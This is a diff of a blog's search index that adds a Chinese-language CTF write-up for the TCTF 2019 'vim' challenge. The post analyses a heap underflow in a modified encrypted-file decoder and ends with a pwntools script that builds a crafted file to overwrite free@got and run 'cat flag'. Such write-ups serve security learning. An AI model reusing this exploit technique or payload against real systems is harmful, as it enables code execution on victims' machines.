@@ -1,14 +1,26 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[TCTF 2019 vim]]></title>
+    <url>%2F2019%2F04%2F04%2FTCTF-2019-vim%2F</url>
+    <content type="text"><![CDATA[自定义的加解密方法存在漏洞。 0x00 源代码刨析key设置为恒为字符串a。 1234// to avoid interactive step, without loss of generalityp1 = alloc(8);p1[0] = 'a';p1[1] = NUL; cryptstate_T结构体： 12345678910/* The state of encryption, referenced by cryptstate_T. */typedef struct &#123; int key; int shift; int step; int orig_size; int size; int cur_idx; char_u *buffer;&#125; perm_state_T; init函数，其中主要做的是计算cryptstate_T结构体的key，可以在此函数下断点验证传入的key是否为”a”。 1234567891011121314151617181920crypt_perm_init( cryptstate_T *state, char_u *key, char_u *salt UNUSED, int salt_len UNUSED, char_u *seed UNUSED, int seed_len UNUSED)&#123; char_u *p; perm_state_T *ps; ps = (perm_state_T *)alloc(sizeof(perm_state_T)); ps-&gt;key = 0; state-&gt;method_state = ps; for (p = key; *p != NUL; ++p) &#123; ps-&gt;key = 131*ps-&gt;key + *p; &#125;&#125; 解密函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758crypt_perm_decode( cryptstate_T *state, char_u *from, size_t len, char_u *to)&#123; perm_state_T *ps = state-&gt;method_state; size_t i; if (len&lt;=4) &#123; for (i = 0; i &lt; len; ++i) to[i] = from[i]; return; &#125; unsigned int iv; for (i = 0; i &lt; 4; ++i) &#123; to[i] = from[i]; iv = (iv&lt;&lt;8) + from[i]; &#125; ps-&gt;orig_size = len-4; ps-&gt;size = ps-&gt;orig_size; while (!is_prime(ps-&gt;size)) ps-&gt;size++; ps-&gt;shift = ps-&gt;key % (len-4); if (ps-&gt;shift &gt; 0) ps-&gt;buffer = alloc(ps-&gt;shift); ps-&gt;step = ps-&gt;key ^ iv; if (ps-&gt;step % ps-&gt;size == 0) ps-&gt;step++; ps-&gt;cur_idx = 0; /* Step 1: Inverse of Multiplication */ i = 4; while (i &lt; len) &#123; if (ps-&gt;cur_idx &lt; ps-&gt;orig_size) &#123; to[ps-&gt;cur_idx+4] = from[i]; i++; &#125; ps-&gt;cur_idx = (ps-&gt;cur_idx+ps-&gt;step)%ps-&gt;size; &#125; /* Step 2: Inverse of Addition */ for (i = 0; i &lt; ps-&gt;shift; ++i) ps-&gt;buffer[i] = to[i+4]; for (i = 4+ps-&gt;shift; i &lt; len; ++i) to[i-ps-&gt;shift] = to[i]; for (i = 0; i &lt; ps-&gt;shift; ++i) to[len-ps-&gt;shift+i] = ps-&gt;buffer[i]; if (ps-&gt;shift &gt; 0) vim_free(ps-&gt;buffer);&#125; 需要知道IV在头文件中的位置，漏洞主要在步骤1中： 12345678910111213141516171819202122232425262728293031/* The state of encryption, referenced by cryptstate_T. */typedef struct &#123; int key; int shift; int step; int orig_size; int size; int cur_idx; char_u *buffer;&#125; perm_state_T;crypt_perm_decode( cryptstate_T *state, char_u *from, size_t len, char_u *to)&#123; // ... /* Step 1: Inverse of Multiplication */ i = 4; while (i &lt; len) &#123; if (ps-&gt;cur_idx &lt; ps-&gt;orig_size) &#123; to[ps-&gt;cur_idx+4] = from[i]; i++; &#125; ps-&gt;cur_idx = (ps-&gt;cur_idx+ps-&gt;step)%ps-&gt;size; &#125; // ...&#125; 这里没有检查ps-&gt;cur_idx的值，导致可以控制其为负数，造成堆的前向溢出。 from是vim打开的文件。ps-&gt;step可以通过 1234567891011unsigned int iv;for (i = 0; i &lt; 4; ++i)&#123; to[i] = from[i]; iv = (iv&lt;&lt;8) + from[i];&#125;// ...ps-&gt;step = ps-&gt;key ^ iv;if (ps-&gt;step % ps-&gt;size == 0) ps-&gt;step++;ps-&gt;cur_idx = 0; 控制。 如果能改写ps-&gt;buffer的值，就能进一步利用 123/* Step 2: Inverse of Addition */for (i = 0; i &lt; ps-&gt;shift; ++i) ps-&gt;buffer[i] = to[i+4]; 达到任意地址写的目的。 0x01 Debug it生成脚本： 1234567891011121314151617def main(): magic = b'VimCrypt~04!' payload = b'aaaa' payload += b'bbbb' payload += b'cccc' payload += b'dddd' payload += b'eeee' payload += b'ffff' payload += b'gggg' payload += b'hhhh' with open('exp', 'wb') as f: f.write(magic + payload)if __name__ == '__main__': main() 设置参数和断点： crypt_perm_init()断点： 12345678910111213141516crypt_perm_init( cryptstate_T *state, char_u *key, char_u *salt UNUSED, int salt_len UNUSED, char_u *seed UNUSED, int seed_len UNUSED)&#123; // ... ps-&gt;key = 0; // ... for (p = key; *p != NUL; ++p) &#123; ps-&gt;key = 131*ps-&gt;key + *p; &#125;&#125; 可以发现RSI指向的key为字符串”aNUL”，因此ps-&gt;key的值为0x61。 12345crypt_perm_decode( cryptstate_T *state, char_u *from, size_t len, char_u *to) 通过调试可以发现from（图中的rsi指向的数据）即为去除maigc的剩余部分输入内容，也就是说IV即输入文件除去魔术数的前四字节。 123456unsigned int iv;for (i = 0; i &lt; 4; ++i)&#123; to[i] = from[i]; iv = (iv&lt;&lt;8) + from[i];&#125; 为了让ps-&gt;step为-1，ps-&gt;key就要为-1^iv。 1ps-&gt;step = ps-&gt;key ^ iv; 由上图可以知道rax的值为0x900000即ps变量，rcx的值为0x900030即to参数。它们紧挨在一起，使得to的向前溢出能够覆盖ps变量，从而达到改写ps-&gt;buffer的目的。 1234567891011121314151617181920212223242526272829303132333435/* The state of encryption, referenced by cryptstate_T. */typedef struct &#123; int key; int shift; int step; int orig_size; int size; int cur_idx; char_u *buffer;&#125; perm_state_T;crypt_perm_decode( cryptstate_T *state, char_u *from, size_t len, char_u *to)&#123; // ... /* Step 1: Inverse of Multiplication */ i = 4; while (i &lt; len) &#123; if (ps-&gt;cur_idx &lt; ps-&gt;orig_size) &#123; to[ps-&gt;cur_idx+4] = from[i]; i++; &#125; ps-&gt;cur_idx = (ps-&gt;cur_idx+ps-&gt;step)%ps-&gt;size; &#125; // ... /* Step 2: Inverse of Addition */ for (i = 0; i &lt; ps-&gt;shift; ++i) ps-&gt;buffer[i] = to[i+4]; // ...&#125; 但是代码从to[i+4]处开始获得数据写入ps-&gt;buffer，因此需要想办法向to[i+4]之后的地址写入数据。 观察到，ps-&gt;cur_idx是可以被覆盖最高字节的，且在计算的时候会模上from的长度，所以覆盖高字节后，ps-&gt;cur_idx是一个很大的正数，通过求模可将写入to的位置移动到正向方向来进行回写。 0x02 Pwn it在程序中，有一处执行shell的地方： 可以执行rax/rcx的所指向的命令。 crypt_perm_decode()在最后执行了vim_free(ps-&gt;buffer)，而在vim_free()中，call free的时候，rax正是保存了ps-&gt;buffer的地址，因此在修改free@got的同时通过向ps-&gt;buffer写入cat flag即可获取flag。 exp生成脚本如下： 1234567891011121314151617181920212223from pwn import *import structdef main(): elf = ELF('./vim') payload = 'VimCrypt~04!' payload += struct.pack("&gt;i", -1 ^ 0x61) # iv payload += 'aaaaa' payload += p64(0x61)[::-1] payload += 'cccccccc' payload += p64(elf.got['free'] - 4 - 8)[::-1] payload += 'bbbbbbbb' payload += 'cccccc\x00\x00' payload += '\x00\x00\x00\x4c\x91\x63\x00\x00' payload += '\x00\x00galf t' payload += 'ac'.ljust(8, '\x00') with open('exp', 'wb') as f: f.write(payload)if __name__ == '__main__': main()]]></content>
+      <tags>
+        <tag>pwn</tag>
+        <tag>ctf</tag>
+        <tag>2019</tag>
+        <tag>tctf</tag>
+        <tag>vim</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Learn Address Sanitizer with TCTF 2019 babyaegis]]></title>
     <url>%2F2019%2F03%2F27%2FLearn-Address-Sanitizer-with-TCTF-2019-babyaegis%2F</url>
     <content type="text"><![CDATA[比较有趣又能学到新知识的一题。 【施工中】]]></content>
       <tags>
         <tag>pwn</tag>
         <tag>ctf</tag>
-        <tag>2019</tag>
         <tag>heap</tag>
+        <tag>2019</tag>
         <tag>tctf</tag>
         <tag>asan</tag>
       </tags>
@@ -20,8 +32,8 @@
       <tags>
         <tag>pwn</tag>
         <tag>ctf</tag>
-        <tag>2019</tag>
         <tag>heap</tag>
+        <tag>2019</tag>
         <tag>tctf</tag>
       </tags>
   </entry>
